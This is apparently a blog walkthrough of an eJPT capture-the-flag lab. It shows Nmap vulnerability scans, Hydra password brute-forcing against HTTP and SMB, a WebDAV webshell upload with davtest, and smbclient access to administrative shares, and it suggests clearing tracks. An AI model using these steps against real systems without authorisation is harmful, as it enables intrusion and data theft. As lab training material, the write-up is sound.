# :game_die: Walkthrough - Host & Network Penetration Testing: System-Host Based Attacks CTF 1

---

# Walkthrough — Host & Network Penetration Testing: System-Host Based Attacks CTF 1

Hey folks!
In this post, I’m walking you through EJPT CTF-5 (System-Host Based Attacks 1) how I tackled it, my mostly manual approach, and how I hunted down all four flags. No flag leaks here this is about learning, not spoon-feeding. Instead, I’ll share my thought process, tools, and commands used to crack the box.

Let’s dive in!

## Initial Recon: Scanning for Open Ports

First things first, this lab has 2 machine, so we will first exploit machine1 and then work our way to machine2:
target1.ine.local
target2.ine.local

I kicked off an Nmap scan on the target1 and found 5 open services, these were basically web, and smb which were of importance.

```
ping target1.ine.local
nmap -sV --script vuln <targetip>
```

- Flag 1: User ‘bob’ might not have chosen a strong password. Try common passwords to gain access to the server where the flag is located. (target1.ine.local)

As port 80 was open so I directly went on it and found a login portal. Login portal means bruteforcing. As we were already given a username: ‘bob’, I tried to bruteforce it using hydra and found cred.

```
hydra -l bob -P /usr/share/metasploit-framework/data/wordlist/unix_passwords.txt <target> http-get /
```

After logging in we found an IIS info page and after checking its source code there is nothing so the next option is to bruteforce directories as we do have in mind from lectures that if IIS exist there has to be webdav somewhere so in search of it we are bruteforcing.

```
dirb http://<target> -w
```

After bruteforcing we find nothing so we manually go for directory busting and voila we found are first flag.

#note: you can also use curl for getting the flag.

- Flag 2: Valuable files are often on the C: drive. Explore it thoroughly. (target1.ine.local)

As this is a webserver running we can upload a shell and try to get a reverse shell. But which shell do we upload and of which one will execute and run, to solve this issue we will use davtest for checking and uploading exploit, or after checking which files will run we can use cadaver for uploading the exploit.

```
#checking files
davtest -url http://10.5.30.112/webdav -auth <username>:<password>
```

After getting the davtest result we understand it would run .txt, .asp, .aspx and .html files. So our best chance is asp or aspx. You would require username & password also the location of exploit and location of where to upload this exploit.

```
#uploading files
davtest -url http://10.5.30.112/webdav -auth <username>:<password> -uploadfile /usr/share/webshells/asp/webshell.asp -uploadloc /
```

Now, you will get a cmd shell in browser and try to cat out the flag2 in the C drive as given in question. And you will find your second flag.

```
type C:\\flag2.txt
```

#note: I tried msfvenom for more manual approach but it didn't work you can try too, maybe you get lucky. Also you can use cadaver to interact with the server, upload the file and delete sample data from davtest and clear your tracks.

Now, machine1 is complete so we will move on to out machine2 and this is relatively easy.

## Initial Recon: Scanning for second target

As we scanned this machine only 1 service is of our use i.e. smb.

```
nmap -sV <target>

#more define approach
nmap -sVC --script vuln <target>

#for specific port
nmap -sVC -p <port> --script vuln <target>
```

- Flag 3: By attempting to guess SMB user credentials, you may uncover important information that could lead you to the next flag. (target2.ine.local)

As per the clue we will try to brute force smb service and try to get some creds by using hydra to bruteforce and we get multiple credentials, but are goal is admin so we will use admin creds to list shares, connect to it and get our flag out.

#note: you can use metasploit modules such as smb_login, enumshares, enumusers, etc.

## Get Mohammed Ali Mistry’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

After getting creds we will try to list out shares and connect to it by using smbclient. You can also use nmap scripts to list out shares

```
#list out shares
smbclient -L \\\\<target> -U administrator

#connect to a specific share
smbclient \\\\<target>\\<shares> -U administrator
```

After connecting to multiple shares I found my flag in the C$ share, downloaded it and cat it out.

```
smbclient \\\\<target>\\C$ -U administrator
>dir
>download flag3.txt
>exit

#terminal
cat flag3.txt
```

- Flag 4: The Desktop directory might have what you’re looking for. Enumerate its contents. (target2.ine.local)

Now, this is an easy one just go to admin user desktop and your flag is sitting there, download it and cat it out and your second machine is solved too.

```
cd Users\Administrator\Desktop
dir
get flag4.txt
exit

#terminal
cat flag4.txt
```

Hurray we got all the flags, congratulations. Also let me know in the comment box what do you guys think.
Happy hacking!

Also, checkout my previous EJPT - CTF blogs and do share, like and follow me for more such updates.

---
